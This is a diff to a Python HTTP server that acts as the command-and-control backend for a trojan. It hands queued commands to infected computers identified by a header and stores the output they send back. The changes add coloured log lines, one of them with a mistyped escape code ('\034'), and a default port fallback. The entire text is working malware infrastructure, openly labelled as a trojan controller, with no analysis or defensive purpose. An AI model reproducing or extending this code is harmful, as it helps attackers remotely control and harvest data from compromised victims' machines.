@@ -24,12 +24,12 @@ class HTTPRequestHandler(BaseHTTPRequestHandler):
                 with open(f'{computer.lower()}.txt', 'r') as file:
                     html = file.read() #get encrypted html commands
                 self.wfile.write(html.encode('utf8')) #send commands
-                print(f'[*] -> commands sent to computer {computer}')
+                print(f'\033[1;32m[*] -> commands sent to computer {computer}')
             except FileNotFoundError: #trojan not set up on network
                 file = open(f'{computer.lower()}.txt', 'w') #creates file
                 file.close()
                 self.wfile.write(bytes('setup complete', 'utf8'))
-                print(f'[+] New trojan running on computer {computer}')
+                print(f'\034[1;32m[+] New trojan running on computer {computer}')
         except Exception as e: #no computerID
             self._set_headers(403) #set headers- valid but unauthorised to carry 
             
@@ -40,7 +40,7 @@ class HTTPRequestHandler(BaseHTTPRequestHandler):
         try:
             self._set_headers(200)
             computer = headers['Computer-Id'] #gets id sent in header
-            print(f'[*] <- recieved command output from computer {computer}')
+            print(f'\033[1;31m [*] <- recieved command output from computer {computer}')
             with open(f'{computer.lower()}.txt', 'w') as file:
                 file.write(post_data.decode())
         except Exception as e:
@@ -51,5 +51,9 @@ class HTTPRequestHandler(BaseHTTPRequestHandler):
         
 if __name__ == '__main__':
     import sys
-    with HTTPServer((sys.argv[1], int(sys.argv[2])), HTTPRequestHandler) as httpd:
-        httpd.serve_forever()
+    try:
+        with HTTPServer((sys.argv[1], int(sys.argv[2])), HTTPRequestHandler) as httpd:
+            httpd.serve_forever()
+    except IndexError:
+        with HTTPServer(('', 8000), HTTPRequestHandler) as httpd:
+            httpd.serve_forever()
